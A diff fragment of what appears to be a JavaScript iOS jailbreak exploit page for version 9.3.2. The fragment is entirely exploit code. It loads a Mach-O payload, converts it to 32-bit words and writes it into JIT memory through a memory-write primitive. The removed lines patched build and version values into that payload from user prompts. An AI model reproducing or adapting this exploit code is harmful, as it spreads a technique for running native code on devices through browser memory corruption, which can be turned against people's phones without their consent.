@@ -289,7 +289,7 @@ footer {
  	mem2[0] = val;
  	mem0[4] = mem1;
  }
- filestream = load_binary_resource("exec_fv")
+ filestream = load_binary_resource("exec")
  var shll = new Uint32Array(filestream.length / 4);
  for (var i = 0; i < filestream.length;) {
  	var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
@@ -387,32 +387,9 @@ footer {
  	write4(shc, jitf);
  	write4(shc + 4, 1);
  	// copy macho
-        for (var i = 0; i < shll.length; i++) {
-                if(shll[i] == 0x44556677) {
-                        var k=new ArrayBuffer(8*6);
-                        var k8=new Uint8Array(k);
-                        var k32=new Uint32Array(k);
-                        var str=prompt("Real build number:", "13F69");
-                        for(var si=0; si<str.length; si++) k8[si] = str.charCodeAt(si);
-                        for(var si=0; si<k32.length; si++) shll[i+si] = k32[si];
-			break;
-                }
-        }
-        for (var i = 0; i < shll.length; i++) {
-                if(shll[i] == 0x33553377) {
-                        var k=new ArrayBuffer(8*6);
-                        var k8=new Uint8Array(k);
-                        var k32=new Uint32Array(k);
-                        var str=prompt("Real version:", "9.3.2");
-                        for(var si=0; si<str.length; si++) k8[si] = str.charCodeAt(si);
-                        for(var si=0; si<k32.length; si++) shll[i+si] = k32[si];
-			break;
-                }
-        }
-        for (var i = 0; i < shll.length; i++) {
-                write4(jitf + i * 4, shll[i]);
-        }
-
+ 	for (var i = 0; i < shll.length; i++) {
+ 		write4(jitf + i * 4, shll[i]);
+ 	}
  	alert("All set. Close this alert and lock your screen to continue. See you on the other side!")
  	for (var i = 0; i < bss.length; i++) {
  		for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
